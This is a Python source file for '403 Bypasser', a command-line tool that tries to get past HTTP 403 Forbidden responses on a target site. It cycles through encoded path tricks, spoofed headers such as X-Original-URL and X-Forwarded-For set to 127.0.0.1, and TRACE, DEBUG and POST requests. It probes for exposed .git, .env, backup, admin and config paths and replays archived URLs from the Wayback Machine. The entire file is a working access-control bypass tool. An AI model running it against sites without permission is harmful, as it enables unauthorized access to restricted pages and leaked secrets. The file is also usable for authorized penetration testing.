import requests, re
import sys, socket, urllib3
import json, logging, argparse
import urllib.request
from urllib.parse import urlparse
from colorama import Fore
from random import choice
from requests.utils import default_user_agent

user_agent_list, bypass_count = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)', 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MDDCJS)', 'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)', 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G570Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N910F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android-4.0.3; en-us; Galaxy Nexus Build/IML74K) AppleWebKit/535.7 (KHTML, like Gecko) CrMo/16.0.912.75 Mobile Safari/535.7', 'Mozilla/5.0 (Linux; Android 7.0; HTC 10 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'curl/7.35.0', 'Wget/1.15 (linux-gnu)', 'Lynx/2.8.8pre.4 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/2.12.23'), 0

def is_valid_url(url):
    parsed_url = urlparse(url)
    return all([parsed_url.scheme, parsed_url.netloc])

def validate_url(url,path):
    path = path[1:] if path !='' and path[0]=='/' else path
    url, path = url.rstrip('/'), path.rstrip('/')
    try:
        if not is_valid_url(url):
            raise ValueError("Invalid URL format. Ensure it starts with 'http://' or 'https://'.")
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        return url,path

    except ValueError as ve:
        print(f"❌ URL Error: {ve}")
    except requests.exceptions.MissingSchema:
        print("❌ Missing schema. The URL should start with 'http://' or 'https://'.")
    except requests.exceptions.ConnectionError:
        print("❌ Connection error. The server might be down or unreachable.")
    except requests.exceptions.Timeout:
        print("⏳ Request timed out. The server took too long to respond.")
    except requests.exceptions.HTTPError as he:
        print(f"⚠️ HTTP error: {he}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ General request error: {e}")
    sys.exit(1)

def bypass_403(url, path, user_agent, proxy_url, insecure, wayback_machine, verbose, output):
    global bypass_count
    url,path = validate_url(url,path)
    user_agent = user_agent or choice(user_agent_list)

    if path != '':
        variations = [f"{url}/{path}/*", f"{url}/*{path}", f"{url}/%2e/{path}", f"{url}/{path}/.", f"{url}//{path}", f"{url}//{path}/", f"{url}//{path}//", f"{url}/./{path}/./", f"{url}/*/{path}/*/", f"{url}/*/{path}", f"{url}/%2f/{path}", f"{url}/%2f/{path}/", f"{url}/%2f/{path}/%2f/", f"{url}/{path}/%2e%2e/", f"{url}/{path} -H X-Original-URL: /{path}", f"{url}/{path} -H X-Custom-IP-Authorization: 127.0.0.1", f"{url}/{path} -H X-Forwarded-For: http://127.0.0.1", f"{url}/{path} -H X-Originating-IP: 127.0.0.1", f"{url}/{path} -H X-Forward-For: http://127.0.0.1", f"{url}/{path} -H X-Real-IP: http://127.0.0.1", f"{url}/{path} -H X-Forwarded-For: 127.0.0.1:80", f"{url}/{path} -H X-rewrite-url: /{path}", f"{url}/{path}%20", f"{url}/{path}%09", f"{url}/{path}/%3F", f"{url}/{path}/%23", f"{url}/{path}/%2A", f"{url}/{path}/%3B", f"{url}/{path}/%3D", f"{url}/{path}/%26", f"{url}/{path}/%24", f"{url}/{path}/%40", f"{url}/{path}/%5E", f"{url}/{path}/%7C", f"{url}/{path}/%7E", f"{url}/{path}?", f"{url}/{path}.html", f"{url}/{path}/?anything", f"{url}/{path}#", f"{url}/{path} -X POST -H Content-Length: 0", f"{url}/{path}/*", f"{url}/{path}.php", f"{url}/{path}.json", f"{url}/{path}..;/", f"{url}/{path};/", f"{url}/{path} -X TRACE", f"{url}/{path} -X DEBUG", f"{url}/{path} -H X-Forwarded-Host: 127.0.0.1", f"{url}/{path};", f"{url}/{path}.bak", f"{url}/{path}.env", f"{url}/{path}.gitignore", f"{url}/{path}.old", f"{url}/{path}.swp", f"{url}/{path}~", f"{url}/{path}/.git/", f"{url}/{path}/.git", f"{url}/{path}/.svn/", f"{url}/{path}/.hg/", f"{url}/{path}/.well-known/", f"{url}/{path}/?randomparam=value", f"{url}/{path}&", f"{url}/{path}#fragment", f"{url}/{path}/..;/", f"{url}/{path}/;/", f"{url}/{path}/index", f"{url}/{path}/login", f"{url}/{path}/admin", f"{url}/{path}/dashboard", f"{url}/{path}/debug", f"{url}/{path}/config", f"{url}/{path}/setup", f"{url}/{path}/setup/index.php"]
    else:
        variations = [f"{url}/*", f"{url}/%2e/", f"{url}/.", f"{url}//", f"{url}/*/", f"{url}/%2f/", f"{url}/%2e%2e/", f"{url} -H X-Custom-IP-Authorization: 127.0.0.1", f"{url} -H X-Forwarded-For: http://127.0.0.1", f"{url} -H X-Originating-IP: 127.0.0.1", f"{url} -H X-Forward-For: http://127.0.0.1", f"{url} -H X-Real-IP: http://127.0.0.1", f"{url} -H X-Forwarded-For: 127.0.0.1:80", f"{url}/%20", f"{url}/%09", f"{url}/%3F", f"{url}/%23", f"{url}/%2A", f"{url}/%3B", f"{url}/%3D", f"{url}/%26", f"{url}/%24", f"{url}/%40", f"{url}/%5E", f"{url}/%7C", f"{url}/%7E", f"{url}?", f"{url}/?anything", f"{url}#", f"{url} -X POST -H Content-Length: 0", f"{url}/*", f"{url}/..;/", f"{url}/;/", f"{url} -X TRACE", f"{url} -X DEBUG", f"{url} -H X-Forwarded-Host: 127.0.0.1", f"{url}/;", f"{url}/~", f"{url}/.git/", f"{url}/.git", f"{url}/.env", f"{url}/.gitignore", f"{url}/.svn/", f"{url}/.hg/", f"{url}/.well-known/", f"{url}/?randomparam=value", f"{url}/&", f"{url}#fragment", f"{url}/..;/", f"{url}/;/", f"{url}/index", f"{url}/login", f"{url}/admin", f"{url}/dashboard", f"{url}/debug", f"{url}/config", f"{url}/setup", f"{url}/setup/index.php"]

    session = requests.Session()
    if insecure:
        session.verify = False
    if proxy_url != '':
        session.verify = False
        session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    session.headers['User-Agent'] = user_agent
    logging.captureWarnings(True)

    for variation in variations:
        headers,dummy_var,method = {}, variation, {}
        if "-H " in dummy_var:
            parts = dummy_var.split(" -H ")
            dummy_var = parts[0]
            header_parts = parts[1].split(": ", 1)
            if len(header_parts) == 2:
                headers[header_parts[0]] = header_parts[1]

        if "-X " in dummy_var:
            parts = dummy_var.split(" -X ")
            dummy_var = parts[0]
            method = parts[1].split(" ", 1)
            if method[0]=='POST':
                response = session.post(dummy_var, headers=headers, verify=False, allow_redirects=True, data=None)
            elif method[0]=='TRACE':
                response = session.request("TRACE", dummy_var, headers=headers, verify=False, allow_redirects=True)
            elif method[0]=='DEBUG':
                response = session.request("DEBUG", dummy_var, headers=headers, verify=False, allow_redirects=True)
        else:
            response = session.get(dummy_var, headers=headers, verify=False, allow_redirects=True)
        if response.status_code < 300:
            print(f"  {variation} " + Fore.GREEN + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.GREEN + " --> Found " + Fore.RESET)
            bypass_count += 1
        elif response.status_code < 400:
            print(f"  {variation} " + Fore.BLUE + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.BLUE + " --> Moved " + Fore.RESET)
            bypass_count += 1
        elif response.status_code == 401 and verbose:
            print(f"  {variation} " + Fore.RED + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.RED + " --> Unauthorized Access " + Fore.RESET)
        elif response.status_code == 403 and verbose:
            print(f"  {variation} " + Fore.RED + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.RED + " --> Forbidden Access " + Fore.RESET)
        elif response.status_code == 404 and verbose:
            print(f"  {variation} " + Fore.RED + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.RED + " --> Not Found " + Fore.RESET)
        elif response.status_code > 499 and verbose:
            print(f"  {variation} " + Fore.RED + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.RED + " --> Server Error " + Fore.RESET)
        elif verbose:
            print(f"  {variation} " + Fore.RED + f"(Status: {response.status_code})"+ Fore.RESET +f"[Size: {str(len(response.content))}]" + Fore.RESET)
    
    if bypass_count == 0 and verbose == False:
        print(Fore.RED + "\nNot able to bypass 403 response :(\n" + Fore.RESET)

    print(Fore.MAGENTA + "\nWayback Machine:\n" + Fore.RESET)
    waybackurl = "https://web.archive.org/cdx/search/cdx"
    url = wayback_machine if wayback_machine != '' else f"{url}/{path}"
    params = {
        "url": f"{url}*",
        "collapse": "urlkey",
        "output": "text",
        "fl": "original"
    }

    response = response2 = session.get(waybackurl, params=params)

    if response.status_code == 200:
        urls = response.text.splitlines()
        for u in urls:
            try:
                response = session.get(u, allow_redirects=True, timeout=15)
                if response.status_code < 300:
                    print(Fore.GREEN + f" [{response.status_code}, {str(len(response.content))}] --> {u} " + Fore.RESET)
                elif response.status_code < 400:
                    print(Fore.BLUE + f" [{response.status_code}, {str(len(response.content))}] --> {u} " + Fore.RESET)
                elif verbose:
                    print(Fore.RED + f" [{response.status_code}, {str(len(response.content))}] --> {u} " + Fore.RESET)
            except requests.exceptions.ConnectionError:
                print("❌ Connection error: Unable to reach the server.")
            except requests.exceptions.Timeout:
                print("⏳ Request timed out. The server may be slow or unresponsive.")
            except requests.exceptions.RequestException as e:
                print(f"⚠️ General request error: {e}")
            except socket.gaierror:
                print("❌ DNS resolution failed: The domain name could not be resolved.")
            except urllib3.exceptions.MaxRetryError:
                print("🔁 Maximum retries exceeded: The server is unreachable.")
            except Exception as e:
                print(f"⚠️ Unexpected error: {e}")
    else:
        print(f"Request failed with status code {response.status_code}")

    if output != '':
        urls = response2.text.strip().split("\n")
        with open(output, "w") as file:
            for url in urls:
                file.write(url + "\n")
        print(Fore.MAGENTA + f"\nWayback Machine Output Successfully Saved in File: {output}" + Fore.RESET)

if __name__ == "__main__":
    __version__ = Fore.RED + r"""

$$\   $$\  $$$$$$\   $$$$$$\    """+Fore.GREEN+r"""    $$$$$$$\                                                                        """+Fore.RED+r"""
$$ |  $$ |$$$ __$$\ $$ ___$$\   """+Fore.GREEN+r"""    $$  __$$\                                                                       """+Fore.RED+r"""
$$ |  $$ |$$$$\ $$ |\_/   $$ |  """+Fore.GREEN+r"""    $$ |  $$ |$$\   $$\  $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$$\  $$$$$$\   $$$$$$\  """+Fore.RED+r"""
$$$$$$$$ |$$\$$\$$ |  $$$$$ /   """+Fore.GREEN+r"""    $$$$$$$\ |$$ |  $$ |$$  __$$\  \____$$\ $$  _____|$$  _____|$$  __$$\ $$  __$$\ """+Fore.RED+r"""
\_____$$ |$$ \$$$$ |  \___$$\   """+Fore.GREEN+r"""    $$  __$$\ $$ |  $$ |$$ /  $$ | $$$$$$$ |\$$$$$$\  \$$$$$$\  $$$$$$$$ |$$ |  \__|"""+Fore.RED+r"""
      $$ |$$ |\$$$ |$$\   $$ |  """+Fore.GREEN+r"""    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$  __$$ | \____$$\  \____$$\ $$   ____|$$ |      """+Fore.RED+r"""
      $$ |\$$$$$$  /\$$$$$$  |  """+Fore.GREEN+r"""    $$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ $$ |      """+Fore.RED+r"""
      \__| \______/  \______/   """+Fore.GREEN+r"""    \_______/  \____$$ |$$  ____/  \_______|\_______/ \_______/  \_______|\__|      """+Fore.RED+r"""
                                """+Fore.GREEN+r"""              $$\   $$ |$$ |                                                        """+Fore.RED+r"""
                                """+Fore.GREEN+r"""              \$$$$$$  |$$ |                                                        """ + Fore.RESET + '''\n\t\t\t\t\t\t\t\t\t\tBy''' + Fore.YELLOW + "VICTOR AZARIAH\n" + Fore.MAGENTA + "\nUsage: python 403-Bypasser.py -u https://example.com -p path\n" + Fore.RESET
    prog = __version__.split()[0].lower()
    parser = argparse.ArgumentParser(prog=prog, description="403 Bypasser is a security tool designed to bypass 403 Forbidden responses")
    parser = argparse.ArgumentParser(description="403 Bypasser is a security tool designed to bypass 403 Forbidden responses")
    parser.add_argument('-u', "--url", dest="url", required=True, help="The url or domain to bypass.")
    parser.add_argument('-p', "--path", dest="path", default='', help="The path to bypass.")
    agent_help = "Custom or random user agent. -z 'User-agent' for custom. -z for random"
    parser.add_argument('-z', "--user-agent", dest="user_agent", default=default_user_agent(), nargs='?', help=agent_help)    
    parser.add_argument("--proxy", dest="proxy_url", default='', help="Proxy to use for requests [http(s)://host:port]")
    parser.add_argument('-k', "--insecure", dest="insecure", action="store_true", default=False, help="Allow insecure server connections")
    parser.add_argument('-v', "--verbose", dest="verbose", action="store_true", default=False, help="Increase verbosity of result") 
    parser.add_argument('-wb', "--wayback-machine", dest="wayback_machine", default='', help="Check a domain or url in Wayback Machine")
    parser.add_argument('-o', "--output", dest="output", default='', help="Output the Wayback Machine Results")

    try:
        args = parser.parse_args()
        print(__version__)
        bypass_403(args.url, args.path, args.user_agent, args.proxy_url, args.insecure, args.wayback_machine, args.verbose, args.output)
    except KeyboardInterrupt:
        print("\n Keyboard Interupt detected. Exiting bye bye...")